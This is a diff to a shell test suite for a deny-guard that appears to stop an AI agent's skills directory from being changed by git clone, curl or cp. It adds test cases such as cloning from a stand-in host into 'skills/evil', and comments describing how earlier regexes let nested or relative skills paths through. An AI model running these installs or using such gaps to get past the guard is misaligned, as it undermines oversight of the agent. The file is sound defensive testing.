@@ -188,6 +188,21 @@ expect_deny "curl --output-dir .claude/skills/evil -O https://x.example.com/SKIL
 expect_deny "git -C .claude/skills/evil clone https://x.example.com/r"
 # Optional dash-flags may sit between the -C skills value and the clone verb.
 expect_deny "git -C .claude/skills/evil --bare clone https://x.example.com/r"
+# The -C skills value may carry a leading path prefix (nested/relative) — the
+# earlier form glued the skills tail to "-C \"?" so the relative "(^|/)skills/…"
+# could not find its "/" boundary and "git -C build/skills/… clone" /
+# "git -C skills/… clone" bypassed while ".claude/skills/…" was DENY.
+expect_deny "git -C build/skills/x/SKILL.md clone URL"
+expect_deny "git -C skills/x/SKILL.md clone URL"
+expect_deny "git -C packages/x/skills/foo/SKILL.md clone URL"
+# git clone's positional DESTINATION directory is a skills-install vector too: the
+# ".claude/skills/…" target is caught by the write-verb form, but the RELATIVE
+# directory target with no SKILL.md leaf ("git clone URL skills/x") slipped through.
+expect_deny "git clone URL skills/x"
+expect_deny "git clone URL .claude/skills/x"
+expect_deny "git clone URL build/skills/x"
+expect_deny "git clone --depth 1 https://x.example.com/r skills/evil"
+expect_deny "git clone URL ./skills/x"
 # Plain cp/mv/tee installs into a skills path stay DENY at command position — the
 # CMDPOS anchoring added to SKILLS_WRITE_RX must not weaken the real-write coverage.
 expect_deny "cp template.md .claude/skills/foo/SKILL.md"
@@ -242,6 +257,25 @@ expect_pass "git -C .claude/skills/foo add clone"
 expect_pass "git -C .claude/skills/foo grep clone"
 expect_pass "git -C .claude/skills/foo log --grep clone"
 expect_pass "git -C .claude/skills/foo branch clone"
+# git clone counter-audit — the destination/-C detectors must not over-block:
+# a "clone" word inside a commit message (clone is not the git verb) still PASSES.
+expect_pass "git commit -m 'clone into .claude/skills/x/SKILL.md'"
+expect_pass "git commit -m 'clone into skills/x'"
+# "git clone" whose leading command is inside a quoted arg (echo is the command).
+expect_pass "echo 'git clone URL skills/x'"
+# clone into a NON-skills destination still PASSES (outside the skills dir).
+expect_pass "git clone URL /tmp/x"
+expect_pass "git clone URL mybuild"
+# a remote URL that merely CONTAINS "/skills/" (or an scp "host:org/skills/" URL)
+# clones into cwd, not a skills dir — the colon-free arg-boundary anchor keeps the
+# URL from firing, so a legit clone-from-a-skills-repo PASSES.
+expect_pass "git clone https://h/org/skills/r.git /tmp/x"
+expect_pass "git clone git@host:org/skills/r.git ./x"
+# lookalike destinations that are NOT a skills dir must PASS (no "/"-boundary before
+# "skills", or "skills" glued into a longer segment).
+expect_pass "git clone URL myskills/x"
+expect_pass "git clone URL /var/skills-backup"
+expect_pass "git -C myrepo/skills-stuff clone URL"
 # A write VERB that merely appears inside a string/comment/other-command's arg has
 # no command-position separator before it and must NOT fire (finding 1 — the
 # SKILLS_WRITE_RX regression where these were wrongly DENY).
